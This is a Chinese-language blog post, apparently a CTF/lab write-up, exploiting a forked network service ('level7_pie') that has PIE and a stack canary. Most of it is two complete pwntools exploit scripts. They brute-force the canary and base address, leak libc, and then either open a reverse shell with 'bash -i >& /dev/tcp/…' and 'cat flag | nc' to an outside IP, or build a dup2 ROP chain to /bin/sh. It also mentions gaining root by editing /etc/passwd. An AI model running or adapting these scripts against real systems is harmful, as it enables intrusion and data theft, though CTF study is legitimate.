---
layout: post
title: "pie_爆破ebx+bup2"
date: 2018-07-7
categories: jekyll update
---

### level7_pie

### 记录一下提升用户权限
+ adduser level7
+ vim /etc/passwd
修改对应1000为0，即为提升为root权限

<img src="/images/posts/keen/level7/1530896151213.png" >

### 与level6不同之处
+ 开了PIE，需要泄露程序地址，但是又没有可以泄露地址的特殊漏洞，开了PIE无法用level6的方法
+ 这个多push了一个ebx进栈，刚好在canary之后，可以爆破出这个就是程序的基地址加上0x3000(见下图)；因此我们的目标转变为爆破这个地址，因为后面的地址取值可能会影响程序运行，因此我把canary到ret地址的三个地址都爆破了一遍，因为漏洞所在子进程是fork出来的(子进程的实现可以是fork或者)，因此他的内存地址是同一块内存，所以只需要爆破一次即可(本地调试的时候注意如果进程崩了需要重新爆破一次；远程则不需要)。

<img src="/images/posts/keen/level7/1530959763610.png" >

+ 总结，爆破两个地址，同理泄露出send的地址，找到libc偏移，再用下面两个方法其中一种来做；法二比较简短，法一比较容易理解


### getshell的两个方法
法一：与level6_cookie的方法一样，利用可写的data段地址来反弹shell，详细的见上一篇爆破cookie的文章。

法二：利用dup2函数进行复制标准输入/输出到fd=4的socket通道上返回回来。

参考文章
+ https://www.usna.edu/Users/cs/aviv/classes/ic221/s16/lec/21/lec.html
+ https://blog.csdn.net/silent123go/article/details/71108501

<img src="/images/posts/keen/level7/764102387061821104.jpg" >



### 详细脚本如下：
### 法一实现
**注意这里第一个爆破出的0是不必要的，只是当时爆破一下看下这个取值是否会影响后面的爆破过程。**
```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'

IP = '192.168.210.11'
#IP = '192.168.23.130'
PORT = 10007

canary = "\x00"
padding = "a"*64
'''
####bruteforce cookie####
for x in xrange(3):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    canary += chr(y)
print "cookie bruteforce complete with cookie = " + hex(u32(canary))
'''
canary = p32(0x96147f00)  #remote
#canary = p32(0x8198ab00) #local

libc = ELF('libc.so.6')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('pie')

#### test canary####
#payload = padding + canary +'a'*12 
#p.sendlineafter('See you again!\n', payload)

####bruteforce ebpofoverflow(point to retofoverflow_main)####
'''
ebp1 = ""

for x in xrange(4):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+ebp1+chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    ebp1 += chr(y)
print "ebp1 bruteforce complete with ebp1 = " + hex(u32(ebp1))

'''
ebp1 = "\x00"*4
####bruteforce base####
'''
base = ""

for x in xrange(4):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+ ebp1 + base +chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    base += chr(y)
print "base bruteforce complete with base = " + hex(u32(base))
'''
base = p32(0x56568000) #remote
#base = p32(0x8000f000)  #local
'''
### bruteforce 3 ####

ebp2 = ""

for x in xrange(4):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+ebp1 + base + ebp2 +chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    ebp2 += chr(y)
print "ebp2 bruteforce complete with ebp2 = " + hex(u32(ebp2))
'''
ebp2 = p32(0xffd0c114)  #remote stack
#ebp2 = p32(0xbfb72334)  #local stack

##############
p = remote(IP, PORT)
send_plt = elf.plt['send']
send_got = elf.got['send']
base_addr = u32(base)-0x3000
payload1 = padding + canary + ebp1 + base + ebp2 + p32(base_addr + send_plt) + p32(0) + p32(4) + p32(base_addr + send_got) + p32(4) + p32(0)
pause()
p.sendlineafter('Would you like some delicious pie?\n', payload1)
recved = p.recv()
print(len(recved))
send_addr = u32(recved)
p.info('send addr %x' % send_addr)

libc_base = send_addr - libc.symbols['send']
p.info('libc base %x' % libc_base)

system_addr = libc_base + libc.symbols['system']
system_cmd = 'ls'
p.info('system addr %x' % system_addr)
recv_plt = elf.plt['recv']
writable_addr = base_addr + 0x307C

p = remote(IP, PORT)
pause()
payload2 = 'bash -i >& /dev/tcp/207.148.66.85/8888 0>&1'.ljust(64, '\x00') + canary + ebp1 + base + ebp2 + p32(base_addr + recv_plt) + p32(system_addr) + p32(4) + p32(writable_addr) + p32(100) + p32(0)

#payload2 = 'bash -i >& /dev/tcp/192.168.23.130/8888 0>&1'.ljust(64, '\x00') + canary + 'a' * 12 + p32(recv_plt) + p32(0x08048fb8) + p32(4) + p32(writable_addr) + p32(100) + p32(0) + p32(system_addr) + p32(0) + p32(writable_addr)

p.sendlineafter('Would you like some delicious pie?', payload2)
p.send('cat flag | nc 207.148.66.85 8888'.ljust(100, '\x00'))


payload3 = 'a' * 64 + canary + ebp1 + base + ebp2 + p32(system_addr) + p32(0) + p32(writable_addr)
p.info('system %x' % system_addr)
p.close()
p = remote(IP, PORT)
p.sendlineafter('Would you like some delicious pie?', payload3)
```

### 法二(dup2)

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'

IP = '192.168.210.11'
#IP = '192.168.23.130'
PORT = 10007

canary = "\x00"
padding = "a"*64
'''
####bruteforce cookie####
for x in xrange(3):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    canary += chr(y)
print "cookie bruteforce complete with cookie = " + hex(u32(canary))
'''
canary = p32(0x96147f00)  #remote
#canary = p32(0x8198ab00) #local

libc = ELF('libc.so.6')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('pie')

#### test canary####
#payload = padding + canary +'a'*12 
#p.sendlineafter('See you again!\n', payload)

####bruteforce ebpofoverflow(point to retofoverflow_main)####
'''
ebp1 = ""

for x in xrange(4):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+ebp1+chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    ebp1 += chr(y)
print "ebp1 bruteforce complete with ebp1 = " + hex(u32(ebp1))

'''
ebp1 = "\x00"*4
####bruteforce base####
'''
base = ""

for x in xrange(4):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+ ebp1 + base +chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    base += chr(y)
print "base bruteforce complete with base = " + hex(u32(base))
'''
base = p32(0x56568000) #remote
#base = p32(0x8000f000)  #local
'''
### bruteforce 3 ####

ebp2 = ""

for x in xrange(4):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+ebp1 + base + ebp2 +chr(y) + chr(10))
            try:
                info = p.recvuntil('See you again!')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    ebp2 += chr(y)
print "ebp2 bruteforce complete with ebp2 = " + hex(u32(ebp2))
'''
ebp2 = p32(0xffd0c114)  #remote stack
#ebp2 = p32(0xbfb72334)  #local stack

##############
p = remote(IP, PORT)
send_plt = elf.plt['send']
send_got = elf.got['send']
base_addr = u32(base)-0x3000
payload1 = padding + canary + ebp1 + base + ebp2 + p32(base_addr + send_plt) + p32(0) + p32(4) + p32(base_addr + send_got) + p32(4) + p32(0)
pause()
p.sendlineafter('Would you like some delicious pie?\n', payload1)
recved = p.recv()
print(len(recved))
send_addr = u32(recved)
p.info('send addr %x' % send_addr)

libc_base = send_addr - libc.symbols['send']
p.info('libc base %x' % libc_base)


ppr_addr_offset = 0x0000122a
dup2_offset = libc.symbols["dup2"]
binsh_offset = next(libc.search('/bin/sh'))
dup2_addr = libc_base + dup2_offset
binsh_addr = libc_base + binsh_offset
system_addr = libc_base + libc.symbols['system']
p.info('system addr %x' % system_addr)
ppr_addr = base_addr + ppr_addr_offset


p = remote(IP, PORT)
payload2 = padding + canary + ebp1 + base + ebp2 + p32(dup2_addr) + p32(ppr_addr) + p32(4) + p32(1) + p32(dup2_addr) + p32(ppr_addr) + p32(4) + p32(0) + p32(system_addr) + p32(0) + p32(binsh_addr)

p.sendline(payload2)
sleep(0.1)
p.interactive()

```